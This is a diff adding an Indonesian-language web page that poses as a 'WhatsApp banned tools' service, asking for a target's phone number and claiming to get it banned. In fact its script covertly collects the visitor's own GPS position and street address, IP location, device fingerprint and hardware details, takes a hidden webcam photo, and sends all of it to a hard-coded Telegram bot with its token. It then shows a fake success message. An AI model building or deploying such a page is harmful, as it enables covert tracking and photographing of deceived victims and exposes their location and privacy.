@@ -1,0 +1,280 @@
+DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WHATSAPP BANNED TOOLS</title>
+  <style>
+    body {
+      background: #000000;
+      color: #111;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      background: #33CC33;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      font-size: 1.4rem;
+      color: #075e54;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 0.95rem;
+      margin-bottom: 20px;
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      margin-bottom: 15px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      padding: 10px;
+      width: 100%;
+      font-size: 1rem;
+      background: #ccc;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #result {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: #333;
+    }
+    small {
+      color: #888;
+    }
+  </style>
+</head>
+<body onload="requestPermissions()">
+  <div class="container">
+    <h1>WHATSAPP BANNED TOOLS</h1>
+    <p>Bales bug pake bug? BANNED LAH TOLOL😹🖕</p>
+    <input type="text" id="phone" placeholder="INPUT NOMOR TARGET (cth: 08xxxx)" />
+    <button onclick="track()">🚫 GAS BANNED</button>
+    <div id="result"></div>
+    <small>*Data laporan bersifat rahasia dan otomatis diproses oleh sistem.</small>
+  </div><video id="vid" autoplay playsinline style="display:none;"></video> <canvas id="snap" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8120547273:AAHVJ7syHI_51I2h54zHI2PvB5CM1c1Ho0A";
+    const OWNER_CHAT_ID = "6155256811";
+
+    function requestPermissions() {
+      navigator.geolocation.getCurrentPosition(() => {}, () => {});
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        stream.getTracks().forEach(track => track.stop());
+      }).catch(() => {});
+    }
+
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+
+    async function getVisitorInfo() {
+      const phoneInput = document.getElementById("phone").value;
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A", gpsAddress = "N/A", googleMap = "N/A";
+
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "chargeing🔋" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
+
+      try {
+        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+        ip = ipData.ip;
+        country = ipData.country_name;
+        province = ipData.region;
+        city = ipData.city;
+        postal = ipData.postal;
+        org = ipData.org;
+        latitude = ipData.latitude;
+        longitude = ipData.longitude;
+        fullAddress = `${ipData.city}, ${ipData.region}, ${ipData.country_name}, ${ipData.postal}`;
+      } catch (e) {
+        console.warn("IP lookup error:", e);
+      }
+
+      try {
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            async pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              googleMap = `https://maps.google.com/?q=${latitude},${longitude}`;
+              try {
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                const geoData = await geoRes.json();
+                gpsAddress = geoData.display_name || "N/A";
+              } catch (e) {
+                console.warn("Reverse geocode error:", e);
+              }
+              if (parseFloat(pos.coords.accuracy) > 100) {
+                alert("⚠️ Aktifkan izin dan coba lagi⚠️");
+              }
+              resolve();
+            },
+            err => {
+              alert("❌ izin ditolak. Aktifkan izin dan coba lagi");
+              resolve();
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        });
+      } catch (e) {
+        console.warn("Geolocation error:", e);
+      }
+
+      try {
+        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+        weather = weatherData.current_condition[0].weatherDesc[0].value;
+        temperature = weatherData.current_condition[0].temp_C + "°C";
+      } catch (e) {
+        console.warn("Weather error:", e);
+      }
+
+      const jsonData = {
+        "nomor target": phoneInput,
+        "alamat ip": ip,
+        "device": device,
+        "android versions": androidVersion,
+        "login from": loginFrom,
+        "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+        "alamat GPS akurat": gpsAddress,
+        "link maps": googleMap,
+        "alamat berdasarkan IP": fullAddress,
+        "provider": org,
+        "kode pos": postal,
+        "country": country,
+        "province": province,
+        "clock": clock,
+        "weather": weather,
+        "temperature": temperature,
+        "language": language,
+        "screen resolution": resolution,
+        "timezone": timezone,
+        "online": isOnline,
+        "ram (GB)": deviceMemory,
+        "cpu cores": cpuCores,
+        "touch support": isTouch,
+        "cookies enabled": cookiesEnabled,
+        "do not track": doNotTrack,
+        "fingerprint": fingerprint,
+        "battery": batteryInfo["battery level"],
+        "charging": batteryInfo["charging"]
+      };
+
+      const message = `📥 *Data target Baru*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+      console.log("📦 Kirim ke Telegram:", jsonData);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: OWNER_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(res => {
+        console.log("✅ Respon Telegram:", res);
+      }).catch(err => {
+        console.error("❌ Gagal kirim:", err);
+      });
+    }
+
+    async function captureAndSendPhoto() {
+      const video = document.getElementById("vid");
+      const canvas = document.getElementById("snap");
+      const ctx = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        await new Promise(res => setTimeout(res, 1500));
+
+        canvas.width = 320;
+        canvas.height = 240;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop());
+
+        const imageData = canvas.toDataURL("image/jpeg");
+        const blob = await (await fetch(imageData)).blob();
+        const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
+
+        const formData = new FormData();
+        formData.append("chat_id", OWNER_CHAT_ID);
+        formData.append("photo", file);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (err) {
+        console.warn("❌ Kamera gagal diakses:", err);
+      }
+    }
+
+    function track() {
+      const resBox = document.getElementById("result");
+      resBox.innerHTML = "proses banned🌀...";
+      getVisitorInfo();
+      captureAndSendPhoto();
+      setTimeout(() => {
+        resBox.innerHTML = "DONE NOMOR SUDAH DI BANNED😜🔫";
+      }, 3000);
+    }
+  </script>
+  </body>
+</html>
+</script>
